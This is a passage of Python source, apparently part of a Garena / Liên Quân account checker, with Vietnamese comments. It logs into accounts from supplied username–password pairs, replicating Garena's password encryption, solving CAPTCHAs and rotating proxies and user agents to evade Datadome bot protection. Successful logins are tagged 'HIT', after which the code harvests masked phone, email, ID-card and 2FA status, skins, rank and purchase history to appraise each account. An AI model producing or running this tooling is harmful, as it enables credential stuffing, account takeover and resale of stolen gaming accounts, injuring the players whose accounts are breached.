    except Exception:
        return ""


def _garena_aes_encode_password(md5_hex: str, v1: str, v2: str) -> str:
    """
    Match PHP EnCode used by public Garena checkers:
      key = sha256_hex(sha256_hex(md5 + v1) + v2)
      AES-256-ECB(hex2bin(md5), hex2bin(key)) → first 16 ciphertext bytes as hex
    """
    try:
        md5_hex = str(md5_hex).strip().lower()
        v1 = str(v1)
        v2 = str(v2)
        if len(md5_hex) != 32:
            return ""
        inner = hashlib.sha256(f"{md5_hex}{v1}".encode("utf-8")).hexdigest()
        key_hex = hashlib.sha256(f"{inner}{v2}".encode("utf-8")).hexdigest()
        key = bytes.fromhex(key_hex)
        plaintext = bytes.fromhex(md5_hex)
        # PKCS#7 pad (OpenSSL default) — 16-byte block → 32-byte ciphertext
        pad_len = 16 - (len(plaintext) % 16)
        padded = plaintext + bytes([pad_len] * pad_len)
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        encryptor = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
        ct = encryptor.update(padded) + encryptor.finalize()
        return ct[:16].hex()
    except Exception:
        return ""


def _password_login_session_key(account: str, password: str, proxy=None, sess=None,
                                max_captcha: int = 2) -> str:
    """
    Password SSO for Account Center (app_id=10100):
      prelogin → AES password → login → session_key
    Used when TCP sso_key exchange fails or CAPTCHA HTTP HIT path.
    """
    if not HAS_REQUESTS or not account or not password:
        return ""
    if sess is None:
        sess = _get_http_session(proxy)
    if sess is None:
        return ""
    ua = _random_desktop_browser_ua()
    md5pw = hashlib.md5(password.encode("utf-8")).hexdigest()
    headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://account.garena.com/",
    }

    for attempt in range(max_captcha + 1):
        captcha_key = captcha = ""
        if attempt > 0:
            try:
                ckey, ctext = _solve_garena_captcha(proxy_dict=_get_http_proxies(proxy))
            except Exception:
                ckey, ctext = "", ""
            if not ckey or not ctext:
                continue
            captcha_key, captcha = ckey, ctext
        try:
            pre_params = {
                "account": account,
                "format": "json",
                "id": str(int(time.time() * 1000)),
                "app_id": "10100",
            }
            if captcha_key:
                pre_params["captcha_key"] = captcha_key
                pre_params["captcha"] = captcha
            pre = sess.get(
                "https://sso.garena.com/api/prelogin",
                params=pre_params,
                headers=headers,
                verify=False,
                timeout=_ACCT_SEC_HTTP_TIMEOUT,
            )
            if pre.status_code != 200:
                continue
            try:
                pdata = pre.json()
            except Exception:
                continue
            if not isinstance(pdata, dict):
                continue
            err = str(pdata.get("error") or pdata.get("error_code") or "")
            if err in ("error_captcha", "error_require_captcha", "require_captcha"):
                continue
            v1, v2 = pdata.get("v1"), pdata.get("v2")
            if not v1 or not v2:
                # Fall back: some endpoints still accept raw MD5
                enc_pw = md5pw
            else:
                enc_pw = _garena_aes_encode_password(md5pw, str(v1), str(v2))
                if not enc_pw:
                    enc_pw = md5pw

            login = sess.get(
                "https://sso.garena.com/api/login",
                params={
                    "account": account,
                    "password": enc_pw,
                    "format": "json",
                    "id": str(int(time.time() * 1000)),
                    "app_id": "10100",
                    "redirect_uri": "https://account.garena.com/",
                },
                headers=headers,
                verify=False,
                timeout=_ACCT_SEC_HTTP_TIMEOUT,
                allow_redirects=False,
            )
            if login.status_code not in (200, 301, 302, 303, 307, 308):
                continue
            sk = _extract_session_key_from_response(login, sess)
            if sk:
                return sk
            # JSON error may still carry session_key on partial success
            try:
                j = login.json()
                if isinstance(j, dict):
                    err2 = str(j.get("error") or "")
                    if err2 in ("error_captcha", "error_require_captcha", "require_captcha"):
                        continue
                    if j.get("session_key"):
                        return str(j.get("session_key")).strip()
            except Exception:
                pass
        except Exception:
            continue
    return ""


def _fetch_account_security(sso_key: str = "", proxy=None, retries: int = None,
                            account: str = None, password: str = None,
                            alt_keys: list = None) -> dict:
    """
    Fetch masked phone, email, CCCD, 2FA from account.garena.com.
    Multi-strategy: init(sso_key) → universal redirect_uri → alt keys → password.
    """
    if not HAS_REQUESTS:
        return {}
    sso_key = (sso_key or "").strip()
    alts = [str(k).strip() for k in (alt_keys or []) if k and str(k).strip()]
    if not sso_key and not alts and not (account and password):
        return {}
    attempts = _ACCT_SEC_RETRIES if retries is None else max(0, int(retries))
    for attempt in range(attempts + 1):
        if attempt:
            _invalidate_http_session(proxy)
        info = _fetch_account_security_once(
            sso_key, proxy, account=account, password=password, alt_keys=alts,
        )
        if info:
            return info
        if attempt < attempts:
            time.sleep(0.35 * (attempt + 1))
    return {}


def _fetch_account_security_once(sso_key: str = "", proxy=None,
                                 account: str = None, password: str = None,
                                 alt_keys: list = None) -> dict:
    """
    Single multi-strategy attempt (order proven live):
      1) init?session_key=<sso_key|278 token>   ← sso_key works as session_key
      2) universal/login → parse redirect_uri.session_key → init
      3) password prelogin AES (often Datadome-blocked without residential proxy)
    Only returns dict when user_info is valid (no false-OK empty profile).
    """
    if not HAS_REQUESTS:
        return {}
    sso_key = (sso_key or "").strip()
    candidates = []
    for k in [sso_key] + list(alt_keys or []):
        k = (k or "").strip()
        if k and k not in candidates:
            candidates.append(k)
    if not candidates and not (account and password):
        return {}
    try:
        sess = _get_http_session(proxy)
        if sess is None:
            return {}
        ua = _random_android_browser_ua()
        best = {}

        def _keep(info: dict) -> dict:
            """Giữ payload giàu field nhất (phone/email/…)."""
            nonlocal best
            if not info:
                return best
            if not best:
                best = info
                return best
            score_keys = (
                "masked_phone", "masked_email", "idcard", "authenticator_enable",
                "two_step_verify", "fb_connected", "login_history", "password_set",
            )
            def _sc(d):
                s = 0
                if _truthy_mask(d.get("masked_phone")):
                    s += 3
                if _truthy_mask(d.get("masked_email")):
                    s += 3
                if _truthy_mask(d.get("idcard")):
                    s += 2
                if d.get("authenticator_enable"):
                    s += 1
                if d.get("two_step_verify"):
                    s += 1
                if d.get("fb_connected"):
                    s += 1
                if d.get("login_history"):
                    s += 1
                if d.get("password_set"):
                    s += 1
                return s
            if _sc(info) >= _sc(best):
                # merge non-empty into best
                merged = dict(best)
                for k, v in info.items():
                    if v in (None, "", [], {}):
                        continue
                    if k not in merged or merged.get(k) in (None, "", [], {}, 0):
                        merged[k] = v
                    elif k in ("masked_phone", "masked_email", "idcard") and _truthy_mask(v):
                        merged[k] = v
                best = merged
            return best

        # 1) Primary Route: Direct init with each candidate key (sso_key / session_token)
        for key in candidates:
            info = _account_init_with_session_key(sess, key, ua)
            _keep(info)
            if best and (
                (_truthy_mask(best.get("masked_phone")) or _truthy_mask(best.get("masked_email")))
                or best.get("login_history")
            ):
                return best

        # 2) Primary Route Sub-step: universal/login exchange
        for key in candidates:
            sk = _exchange_sso_key_for_session(sess, key, ua)
            if sk and sk not in candidates:
                info = _account_init_with_session_key(sess, sk, ua)
                _keep(info)
                if best and (_truthy_mask(best.get("masked_phone")) or _truthy_mask(best.get("masked_email"))):
                    return best

        if best and (_truthy_mask(best.get("masked_phone")) or _truthy_mask(best.get("masked_email"))):
            return best

        # ── FALLBACK 1 (Giải pháp 2): Password Web SSO AES Login Direct to Account Center ──
        if account and password:
            try:
                _invalidate_http_session(proxy)
            except Exception:
                pass
            sess2 = _get_http_session(proxy) or sess
            sk_pass = _password_login_session_key(
                account, password, proxy=proxy, sess=sess2, max_captcha=3,
            )
            if sk_pass:
                info_pass = _account_init_with_session_key(sess2, sk_pass, _random_desktop_browser_ua())
                _keep(info_pass)
                if best:
                    return best

        return best
    except Exception:
        return {}


def _fetch_account_info_with_retry(sock, session_key: bytes, retries: int = None) -> dict:
    """Retry CMD 342 when bulk load causes transient TCP timeouts."""
    attempts = _TCP_INFO_RETRIES if retries is None else max(0, int(retries))
    for attempt in range(attempts + 1):
        info = _fetch_account_info(sock, session_key)
        if info:
            return info
        if attempt < attempts:
            time.sleep(0.2 * (attempt + 1))
    return {}


def _fetch_uac_country(sso_key: str, proxy=None) -> str:
    """Fetch UAC country code from shop.garena.sg using sso_key, bypassing Datadome block."""
    if not HAS_REQUESTS or not sso_key:
        return ""
    try:
        import time
        sess = _get_http_session(proxy)
        sess.cookies.set('sso_key', sso_key)
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": _random_desktop_browser_ua(),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        token_resp = sess.post(token_url, headers=token_headers, data=token_data, timeout=5, verify=False)
        access_token = token_resp.json().get('access_token')
        if access_token:
            inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
            inspect_resp = sess.post(inspect_url, json={'token': access_token}, timeout=5, verify=False)
            uac = inspect_resp.json().get('uac')
            if uac:
                return str(uac).strip().upper()
    except Exception:
        pass
    return ""

# ── Liên Quân skin ID & Hero database (Delegated to skin_engine) ─────────────
from skin_engine import (
    classify_skins as _classify_skins,
    get_hero_name,
    get_skin_name,
    skin_hero_id as _skin_hero_id,
    skin_id_to_name as _skin_id_to_name,
    load_full_skin_maps as _load_full_skin_maps,
    SKIN_SSS, SKIN_SS, SKIN_ANIME, SKIN_HUUHAN, SKIN_SSM, SKIN_TUYETSAC,
    SKIN_CHUYENSAC, SKIN_EVO, SKIN_S_PLUS, SKIN_S, SKIN_A, SKIN_SPECIAL,
    SKIN_OTHER, _SKIN_ALL, _HERO_ALL, _SKIN_ALL_LOADED
)

def _get_app_redirect_url(sock, session_key: bytes, redirect_uri: str) -> str:
    """Use CMD_APP_OAUTH_LOGIN with redirect_uri to obtain a ?code=... login URL."""
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, redirect_uri) +
            _pf_varint(3, 1) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return ''
        fields = _proto_decode(resp)
        url = _proto_get(fields, 2, b'')
        return url.decode('utf-8') if isinstance(url, bytes) else str(url)
    except Exception:
        return ''


def _fetch_sale_skins(redirect_url: str, proxy=None) -> dict:
    """Use pre-computed ?code=... redirect URL to authenticate with sale.lienquan.garena.vn."""
    if not HAS_REQUESTS or not redirect_url:
        return {}

    def _once() -> dict:
        sess = _get_http_session(proxy)
        if sess is None:
            return {}
        ua = _random_android_browser_ua()
        headers = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://sale.lienquan.garena.vn/",
            "Origin": "https://sale.lienquan.garena.vn",
        }
        # 1) Auth callback — MUST follow redirects để set cookie session sale site
        try:
            sess.get(
                redirect_url,
                allow_redirects=True,
                verify=False,
                timeout=_SKIN_HTTP_TIMEOUT,
                headers={"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,*/*"},
            )
        except Exception:
            # fallback: no-follow still may set Set-Cookie
            try:
                sess.get(
                    redirect_url,
                    allow_redirects=False,
                    verify=False,
                    timeout=_SKIN_HTTP_TIMEOUT,
                    headers={"User-Agent": ua},
                )
            except Exception:
                return {}

        # Warm homepage if cookie jar still thin
        try:
            if len(sess.cookies) < 1:
                sess.get(
                    "https://sale.lienquan.garena.vn/",
                    allow_redirects=True,
                    verify=False,
                    timeout=8,
                    headers={"User-Agent": ua},
                )
        except Exception:
            pass

        gql = {
            "operationName": "getUser",
            "variables": {},
            "query": (
                "query getUser { getUser { id name icon profile { "
                "ownedItemIdList cp discount shopItems boxItems flippedSlots "
                "pickedItem discountList isBuy "
                "userPack { id packId box_count startTime duration tcid claimedSeq } "
                "} } }"
            ),
        }
        result = {}
        try:
            resp = sess.post(
                "https://sale.lienquan.garena.vn/graphql",
                json=gql,
                headers=headers,
                verify=False,
                timeout=_SKIN_HTTP_TIMEOUT,
            )
            if resp.status_code == 200:
                body = resp.json() if resp.content else {}
                user = (body.get("data") or {}).get("getUser") if isinstance(body, dict) else None
                # GraphQL errors sometimes still have partial data
                if not user and isinstance(body, dict):
                    user = ((body.get("data") or {}) if isinstance(body.get("data"), dict) else {}).get("getUser")
                if user:
                    profile = user.get("profile") or {}
                    owned = profile.get("ownedItemIdList") or profile.get("owned_item_id_list") or []
                    if not isinstance(owned, list):
                        owned = list(owned) if owned else []
                    result = _classify_skins(owned)
                    # giữ raw toàn bộ skin id (để đếm "skin mới" chưa phân loại)
                    result["owned_item_id_list"] = owned
                    # skin chưa nằm trong bất kỳ tier nào → "skin mới" / unclassified
                    _unknown = [str(s) for s in owned
                                if str(s) not in SKIN_SSS and str(s) not in SKIN_ANIME
                                and str(s) not in SKIN_SS and str(s) not in SKIN_OTHER]
                    if _unknown:
                        result["new_skins"] = _unknown
                        result["new_skins_count"] = len(_unknown)
                    try:
                        result["cp"] = int(profile.get("cp", 0) or 0)
                    except Exception:
                        result["cp"] = 0
                    if profile.get("discount") is not None:
                        result["sale_discount"] = profile.get("discount")
                    if user.get("name"):
                        result["sale_name"] = user.get("name")
                    if user.get("icon"):
                        result["sale_icon"] = user.get("icon")
                    if user.get("id") is not None:
                        result["sale_user_id"] = user.get("id")
                    for k in ("shopItems", "boxItems", "flippedSlots"):
                        if profile.get(k) is not None:
                            result[k] = profile.get(k)
                    if profile.get("pickedItem") is not None:
                        result["sale_picked_item"] = profile.get("pickedItem")
                    if profile.get("discountList") is not None:
                        result["sale_discount_list"] = profile.get("discountList")
                    if profile.get("isBuy") is not None:
                        result["sale_is_buy"] = profile.get("isBuy")
                    packs = profile.get("userPack") or []
                    if packs:
                        result["user_packs"] = packs
                        result["user_pack_count"] = len(packs) if isinstance(packs, list) else 1
                    result["_skins_ok"] = True
        except Exception:
            pass

        if not result:
            return {}

        try:
            gql_hist = {
                "query": (
                    "{ getItemHistory(limit: 20, offset: 0) { id source extra costStr "
                    "createdAt itemList { itemId category } } }"
                )
            }
            rh = sess.post(
                "https://sale.lienquan.garena.vn/graphql",
                json=gql_hist,
                headers=headers,
                verify=False,
                timeout=max(8, _SKIN_HTTP_TIMEOUT - 2),
            )
            if rh.status_code == 200:
                hist = (rh.json().get("data") or {}).get("getItemHistory") or []
                if hist:
                    result["item_history"] = hist
                    # recent acquired skins (skin mới mua/roll gần đây) → map tên
                    _recent = []
                    for _h in hist if isinstance(hist, list) else []:
                        if not isinstance(_h, dict):
                            continue
                        _il = _h.get("itemList") or []
                        for _it in (_il if isinstance(_il, list) else []):
                            if not isinstance(_it, dict):
                                continue
                            _iid = str(_it.get("itemId") or "").strip()
                            if not _iid:
                                continue
                            _nm = _skin_id_to_name(_iid)
                            _recent.append({
                                "item_id": _iid,
                                "name": _nm,
                                "category": _it.get("category"),
                                "created_at": _h.get("createdAt"),
                            })
                    if _recent:
                        result["recent_skins"] = _recent
                        result["recent_skins_count"] = len(_recent)
        except Exception:
            pass
        try:
            gql_mail = {"query": "{ getMailbox { MaxMailCount RemainingMailboxVacancies } }"}
            rm = sess.post(
                "https://sale.lienquan.garena.vn/graphql",
                json=gql_mail,
                headers=headers,
                verify=False,
                timeout=6,
            )
            if rm.status_code == 200:
                mb = (rm.json().get("data") or {}).get("getMailbox") or {}
                if isinstance(mb, dict) and mb:
                    result["mailbox"] = mb
        except Exception:
            pass
        return result

    last = {}
    for attempt in range(max(1, int(_SKIN_FETCH_RETRIES) + 1)):
        if attempt:
            try:
                _invalidate_http_session(proxy)
            except Exception:
                pass
            time.sleep(0.3 * attempt)
        last = _once()
        # success: got user profile (kể cả 0 skin)
        if last.get("_skins_ok") or last.get("sale_user_id") is not None or "total_skins" in last:
            return last
    return last or {}


def _get_app_redirect_url_retry(sock, session_key: bytes) -> str:
    """Thử vài redirect_uri sale site — GXX đôi khi reject 1 URI."""
    uris = (
        "https://sale.lienquan.garena.vn/login/callback",
        "https://sale.lienquan.garena.vn/",
        "https://sale.lienquan.garena.vn/login/callback/",
    )
    for uri in uris:
        url = _get_app_redirect_url(sock, session_key, uri)
        if url and ("code=" in url or "sale.lienquan" in url or "garena" in url):
            return url
    return ""

# Bảng map AOV rank_id -> số sao Cao Thủ (populate động từ rank_config)
# Key = rank_id (int), Value = stars (1-50)
_AOV_MASTER_STARS: dict = {}
_AOV_MASTER_STARS_LOCK = __import__('threading').Lock()


def _is_master_rank_name(name: str) -> bool:
    if not name:
        return False
    s = unicodedata.normalize("NFKD", str(name).lower()).encode("ascii", "ignore").decode("ascii")
    s = re.sub(r"[^a-z0-9\s]", " ", s)
    s = re.sub(r"\s+", " ", s).strip()
    return "cao thu" in s or "chien tuong" in s


def _ingest_rank_config_stars(rank_cfg: dict) -> None:
    """Populate _AOV_MASTER_STARS from weeklyreport rank_config when possible."""
    if not isinstance(rank_cfg, dict) or not rank_cfg:
        return
    updates = {}
    for rid_s, entry in rank_cfg.items():
        try:
            rid = int(rid_s)
        except (TypeError, ValueError):
            continue
        if not isinstance(entry, dict):
            continue
        name = entry.get("name") or entry.get("rankName") or ""
        stars = 0
        for field in ("stars", "star", "level", "sub_rank", "tier_level",
                      "rank_level", "sub_level", "division", "star_count"):
            v = entry.get(field)
            if v is None:
                continue
            try:
                n = int(v)
            except (TypeError, ValueError):
                continue
            if 1 <= n <= 50:
                stars = n
                break
        if not stars:
            stars = _extract_master_stars(str(name))
        if stars and _is_master_rank_name(str(name)):
            updates[rid] = stars
    if not updates:
        return
    with _AOV_MASTER_STARS_LOCK:
        _AOV_MASTER_STARS.update(updates)

def _fetch_weekly_profile(access_token: str, proxy=None) -> dict:
    """weeklyreport.moba.garena.vn: player name, rank, rank_id, stars."""
    if not HAS_REQUESTS or not access_token:
        return {}

    def _pick_stars(obj: dict, keys: tuple) -> int:
        if not isinstance(obj, dict):
            return 0
        for f in keys:
            if f not in obj or obj.get(f) is None:
                continue
            try:
                n = int(obj.get(f))
            except (TypeError, ValueError):
                continue
            if 1 <= n <= 99:
                return n
        return 0

    star_keys = (
        'star', 'stars', 'rankStar', 'rank_stars', 'rank_star',
        'starNum', 'star_num', 'starCount', 'star_count',
        'curStar', 'cur_star', 'currentStar', 'current_star',
        'rankStarNum', 'show_star', 'showStar',
    )

    for attempt in range(2):
        try:
            ua = _random_android_browser_ua()
            headers = {'Access-Token': access_token, 'Partition': '1011', 'User-Agent': ua}
            resp = _requests.get(
                "https://weeklyreport.moba.garena.vn/api/profile",
                headers=headers, verify=False, timeout=10,
                proxies=_get_http_proxies(proxy),
            )
            if resp.status_code != 200:
                if attempt == 0:
                    time.sleep(0.25)
                    continue
                return {}
            data = resp.json()
            pi = data.get('player_info', {}) or {}
            rank_cfg = data.get('rank_config', {}) or {}
            _ingest_rank_config_stars(rank_cfg)
            rank_name = ''
            rid = pi.get('rank')
            # một số payload để rank id ở key khác
            if rid is None:
                rid = pi.get('rank_id') or pi.get('rankId') or pi.get('grading')
            rank_entry = {}
            stars = _pick_stars(pi, star_keys)
            if not stars:
                stars = _deep_pick_rank_stars(pi)
            if not stars:
                for nk in ('rankInfo', 'rank_info', 'rank_data', 'ranked', 'battle_info', 'battleInfo'):
                    nested = pi.get(nk)
                    if isinstance(nested, dict):
                        stars = _pick_stars(nested, star_keys) or _deep_pick_rank_stars(nested)
                        if stars:
                            break
            # top-level profile fields
            if not stars:
                stars = _deep_pick_rank_stars(data)
            if rid is not None and str(rid) in rank_cfg:
                rank_entry = rank_cfg[str(rid)] or {}
                rank_name = rank_entry.get('name', '') or rank_entry.get('rankName', '')
                if not stars:
                    stars = _pick_stars(rank_entry, star_keys + (
                        'sub_rank', 'tier_level', 'rank_level', 'sub_level', 'division',
                    ))
            # tên rank từ player_info nếu config miss
            if not rank_name:
                rank_name = _deep_pick_rank_name(pi) or _deep_pick_rank_name(data)
            if not stars and rid is not None:
                try:
                    with _AOV_MASTER_STARS_LOCK:
                        stars = int(_AOV_MASTER_STARS.get(int(rid), 0) or 0)
                except Exception:
                    stars = 0
            if not stars and rank_name:
                stars = _extract_rank_stars(rank_name, 0)
            # format chuẩn: gắn sao vào display nếu chưa có
            rank_display = rank_name or (str(rid) if rid not in (None, "") else "")
            out = {
                'name': pi.get('name', '') or pi.get('player_name', '') or '',
                'rank': rank_display,
                'rank_id': rid,
                'rank_stars': int(stars or 0),
                'rank_entry': rank_entry,
                '_source': 'weeklyreport',
            }
            if pi.get('head_pic'):
                out['head_pic'] = pi.get('head_pic')
            if pi.get('player_uid'):
                out['player_uid'] = pi.get('player_uid')
            tinfo = data.get('time') or {}
            if isinstance(tinfo, dict) and (tinfo.get('start') or tinfo.get('end')):
                out['report_time'] = tinfo
            if data.get('report') is not None:
                out['report'] = data.get('report')
            return out
        except Exception:
            if attempt == 0:
                time.sleep(0.25)
                continue
            return {}
    return {}


def _fetch_aov_user_info(access_token: str, region: str = "VN", proxy=None) -> dict:
    if not HAS_REQUESTS or not access_token:
        return {}
    for attempt in range(2):
        try:
            params = {
                "app_id": str(LIEN_QUAN_APP_ID),
                "region": region or "VN",
                "access_token": access_token,
            }
            resp = _requests.get(
                "https://connect.garena.com/api/v1/game/local-requirement/user-info",
                params=params,
                verify=False,
                timeout=10,
                proxies=_get_http_proxies(proxy),
            )
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict):
                    return data
        except Exception:
            if attempt == 0:
                time.sleep(0.2)
                continue
    return {}


def _enrich_http_hit(out: dict, http_r: dict, proxy=None) -> dict:
    """
    Enrich CAPTCHA/HTTP HIT path.
    Always pull Email/SĐT/CCCD/2FA via password → session_key → account/init
    (HTTP login alone never hits account center).
    """
    token = http_r.get("access_token") or out.get("aov_token") or ""
    account = out.get("account") or ""
    password = out.get("password") or ""

    if token:
        out["aov_access_token"] = token
        open_id = http_r.get("open_id", "")
        if open_id and not out.get("uid"):
            try:
                out["uid"] = int(open_id)
            except (ValueError, TypeError):
                out["uid"] = open_id

        region = (out.get("region") or "VN") or "VN"
        weekly = _fetch_weekly_profile(token, proxy)
        aov_info = _fetch_aov_user_info(token, region=region, proxy=proxy) or {}

        if weekly:
            if weekly.get("name"):
                out["aov_name"] = _prefer_str_field(out.get("aov_name"), weekly.get("name", ""))
            _apply_rank_to_result(
                out,
                rank_name=weekly.get("rank", "") or "",
                rank_id=weekly.get("rank_id"),
                rank_stars=int(weekly.get("rank_stars") or 0),
                rank_entry=weekly.get("rank_entry") or {},
                source="weekly",
            )
            try:
                disc = extra_dump_and_search("http_weekly", weekly, meta={"acc": account})
                if disc.get("extra_keys"):
                    out.setdefault("_extra_discovered", {}).update(disc["extra_keys"])
                    apply_extra_discovered_fields(out, disc["extra_keys"])
            except Exception:
                pass

        if aov_info:
            out["aov_user_info"] = aov_info
        if isinstance(aov_info, dict):
            prefill = ((aov_info.get("data") or {}).get("prefill_mobile") or "").strip()
            if prefill and _truthy_mask(prefill):
                out["aov_prefill_mobile"] = prefill
                if not _truthy_mask(out.get("masked_phone")):
                    out["masked_phone"] = prefill
                out["mobile_bound"] = True
            reg = (aov_info.get("region") or (aov_info.get("data") or {}).get("region") or "").strip()
            if reg and not out.get("region"):
                out["region"] = reg.upper()
            try:
                disc = extra_dump_and_search("http_aov_info", aov_info, meta={"acc": account})
                if disc.get("extra_keys"):
                    out.setdefault("_extra_discovered", {}).update(disc["extra_keys"])
                    apply_extra_discovered_fields(out, disc["extra_keys"])
            except Exception:
                pass

    # Account Center: seed session_key from HTTP login if present, else password SSO
    sso_key = (out.get("sso_key") or http_r.get("sso_key") or "").strip()
    http_sk = (
        out.get("_http_session_key")
        or http_r.get("session_key")
        or ""
    ).strip()
    acct_sec = {}
    if http_sk:
        try:
            sess = _get_http_session(proxy)
            ua = _random_android_browser_ua()
            acct_sec = _account_init_with_session_key(sess, http_sk, ua)
        except Exception:
            acct_sec = {}
    if not acct_sec:
        acct_sec = _fetch_account_security(
            sso_key, proxy, account=account, password=password,
        )
    _apply_acct_sec(out, acct_sec)
    # non-destructive: only mark OK when payload actually has useful fields
    if acct_sec:
        out["_acct_sec_ok"] = True
    # HTTP path: nếu init fail, password login + init lại
    if not out.get("_acct_sec_ok") and account and password:
        try:
            _invalidate_http_session(proxy)
            acct_sec2 = _fetch_account_security(
                sso_key, proxy, retries=2, account=account, password=password,
                alt_keys=[http_sk] if http_sk else [],
            )
            _apply_acct_sec(out, acct_sec2)
            if acct_sec2:
                out["_acct_sec_ok"] = True
        except Exception:
            pass
    # HTTP path has no TCP account info
    if "_tcp_acct_ok" not in out:
        out["_tcp_acct_ok"] = False
    if _truthy_mask(out.get("masked_phone")) or _truthy_mask(out.get("aov_prefill_mobile")):
        out["mobile_bound"] = True
    if int(out.get("email_v") or 0) > 0:
        out["email_verified"] = True
    out["_info_fetch_incomplete"] = bool(not out.get("_acct_sec_ok"))
    out["_fetch_incomplete"] = bool(out.get("_info_fetch_incomplete"))
    out["_needs_proxy_recheck"] = _needs_info_recheck(out)
    # login HIT sticky — fetch fail never demotes to ERROR
    if out.get("status") != "HIT":
        out["status"] = "HIT"

    cc = (out.get("country_code") or "").strip()
    region_raw = (out.get("region") or "VN").strip().upper()
    acc_raw = (out.get("acc_country") or "").strip()
    _resolved = "UNKNOWN"
    for _raw in (cc, acc_raw, region_raw):
        if not _raw:
            continue
        _n = _normalize_country(_raw)
        if _n and _n != "UNKNOWN":
            _resolved = _n
            break
    out["country"] = _resolved

    if out.get("aov_rank") or out.get("aov_rank_stars"):
        _apply_rank_to_result(
            out,
            rank_name=out.get("aov_rank") or "",
            rank_stars=int(out.get("aov_rank_stars") or 0),
        )

    out["status"] = out.get("status") or "HIT"
    _finalize_hit_meta(out)
    return out


def _deep_pick_rank_stars(obj, depth: int = 0) -> int:
    """
    Quét đệ quy object JSON để lấy số sao rank (1-99).
    Bỏ qua field weekly-delta kiểu get_star/lost_star khi đã có cur star.
    """
    if depth > 5 or obj is None:
        return 0
    prefer_keys = (
        "star", "stars", "rankStar", "rank_stars", "rank_star",
        "starNum", "star_num", "starCount", "star_count",
        "curStar", "cur_star", "currentStar", "current_star",
        "rankStarNum", "show_star", "showStar", "iStar", "uiStar",
        "historyMaxStar", "maxStar", "max_star",
    )
    if isinstance(obj, dict):
        # 1) key ưu tiên
        for k in prefer_keys:
            if k not in obj or obj.get(k) is None:
                continue
            try:
                n = int(obj.get(k))
            except Exception:
                continue
            if 1 <= n <= 99:
                return n
        # 2) nested rank objects
        for nk in (
            "rank", "rankInfo", "rank_info", "rankData", "rank_data",
            "ranked", "tier", "grade", "ladder", "seasonRank", "season_rank",
            "currentRank", "curRank", "battleRank",
        ):
            nested = obj.get(nk)
            if isinstance(nested, (dict, list)):
                n = _deep_pick_rank_stars(nested, depth + 1)
                if n:
                    return n
        # 3) any small int under *star* key
        for k, v in obj.items():
            lk = str(k).lower()
            if "star" in lk and "start" not in lk and "delta" not in lk and "lost" not in lk:
                try:
                    n = int(v)
                    if 1 <= n <= 99:
                        return n
                except Exception:
                    pass
            if isinstance(v, (dict, list)) and depth < 3:
                n = _deep_pick_rank_stars(v, depth + 1)
                if n:
                    return n
    elif isinstance(obj, list):
        for it in obj[:20]:
            n = _deep_pick_rank_stars(it, depth + 1)
            if n:
                return n
    return 0


def _looks_like_rank_label(s: str) -> bool:
    s = str(s or "").strip()
    if not s or s.isdigit() or len(s) > 64:
        return False
    fold = unicodedata.normalize("NFKD", s.lower()).encode("ascii", "ignore").decode("ascii")
    fold = re.sub(r"[^a-z0-9\s]", " ", fold)
    fold = re.sub(r"\s+", " ", fold).strip()
    tokens = (
        "dong", "bac", "vang", "kim", "tinh anh", "cao thu", "chien tuong",
        "chien than", "thach dau", "bronze", "silver", "gold", "platinum",
        "diamond", "master", "conqueror", "commander", "t anh", "b kim", "k cuong",
    )
    if any(t in fold for t in tokens):
        return True
    if re.search(r"\b(I{1,3}|IV|V)\b", s) and re.search(r"[A-Za-zÀ-ỹ]", s):
        return True
    if re.search(r"\d+\s*sao", s, re.I):
        return True
    return False


def _deep_pick_rank_name(obj, depth: int = 0) -> str:
    """Lấy tên rank từ nhiều shape JSON."""
    if depth > 4 or not obj:
        return ""
    name_keys = (
        "rankName", "rank_name", "tierName", "tier_name", "name",
        "rank", "tier", "gradeName", "title", "rankTitle", "showName",
    )
    if isinstance(obj, dict):
        for k in name_keys:
            v = obj.get(k)
            if isinstance(v, str) and v.strip() and not v.strip().isdigit():
                # tránh nhầm nickname player
                if k == "name" and not _looks_like_rank_label(v):
                    continue
                s = v.strip()
                if _looks_like_rank_label(s) or k in (
                    "rankName", "rank_name", "tierName", "tier_name", "rankTitle", "gradeName"
                ):
                    return s
        for nk in ("rank", "rankInfo", "rank_info", "tier", "grade", "ladder"):
            nested = obj.get(nk)
            if isinstance(nested, dict):
                n = _deep_pick_rank_name(nested, depth + 1)
                if n:
                    return n
            elif isinstance(nested, str) and nested.strip() and not nested.strip().isdigit():
                if _looks_like_rank_label(nested) or nk == "rank":
                    return nested.strip()
    return ""


def _pick_credit_score(*objs) -> int:
    """Tìm điểm uy tín (0-100) trong dữ liệu player — nhiều tên field khác nhau.
    Trả int 0-100 nếu tìm thấy, else None."""
    keys = (
        "credit", "creditScore", "credit_score", "creditPoint", "credit_point",
        "reputation", "reputationScore", "reputation_score",
        "uyTin", "uy_tin", "uytin", "moralScore", "moral_score",
        "behaviorScore", "behavior_score", "creditValue", "credit_value",
        "dwCreditValue", "dw_credit_value", "trustScore", "trust_score",
        "creditLv", "credit_lv", "creditLevel", "credit_level",
    )
    for obj in objs:
        if not isinstance(obj, dict):
            continue
        # 1) trực tiếp
        for k in keys:
            v = obj.get(k)
            if v is None:
                continue
            try:
                n = int(v)
            except (TypeError, ValueError):
                continue
            if 0 <= n <= 120:
                return n
        # 2) trong banInfo / creditInfo / safetyInfo nested
        for nk in ("banInfo", "creditInfo", "credit_info", "safetyInfo", "safety_info",
                   "reputationInfo", "userCredit", "credit"):
            nested = obj.get(nk)
            if isinstance(nested, dict):
                for k in keys:
